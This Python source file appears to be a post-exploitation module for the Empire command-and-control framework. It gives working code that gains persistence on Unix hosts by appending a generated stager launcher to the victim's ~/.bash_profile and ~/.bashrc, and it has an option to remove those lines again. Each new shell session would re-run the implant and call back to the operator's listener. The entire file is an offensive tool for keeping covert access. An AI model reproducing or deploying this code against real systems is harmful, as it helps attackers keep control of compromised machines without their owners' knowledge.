import base64
class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': '.bash_profile and .bashrc Persistence',

            # list of one or more authors for the module
            'Author': '@infosecn1nja',

            # more verbose multi-line description of the module
            'Description': 'This module establishes persistence via ~/.bash_profile & ~/.bashrc',

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : None,

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : False,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': ''
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Remove' : {
                'Description'   :   'Remove Persistence based on FileName. True/False',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):
        remove = self.options['Remove']['Value']
        listenerName = self.options['Listener']['Value']
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python')
        launcher = launcher.replace("\"","\\\"")
        script = """        
import os.path
import subprocess

def remove_persistence(filename):
    data = ""
    if os.path.isfile(filename):
        for line in open(filename).readlines():
            if 'echo "import sys,base64,warnings;warnings.filterwarnings' in line:
                continue
            data += line

        with open(filename, "w") as persistence:
            persistence.write(data)

Remove = "%s"
home = os.path.expanduser("~")
bash_profile = home + "/.bash_profile"
bashrc = home + "/.bashrc"

if Remove == "True":
    remove_persistence(bash_profile)
    remove_persistence(bashrc)
    print "[+] Persistence has been removed"
else:
    if os.path.isfile(bash_profile):
        with open(bash_profile, "a") as persistence:
            persistence.write("\\n%s")
        print "\\n[+] Persistence has been installed: ~/.bash_profile"

    if os.path.isfile(bashrc):
        with open(bashrc, "a") as persistence:
            persistence.write("\\n%s")
        print "\\n[+] Persistence has been installed: ~/.bashrc"
        """ % (remove, launcher, launcher)

        return script
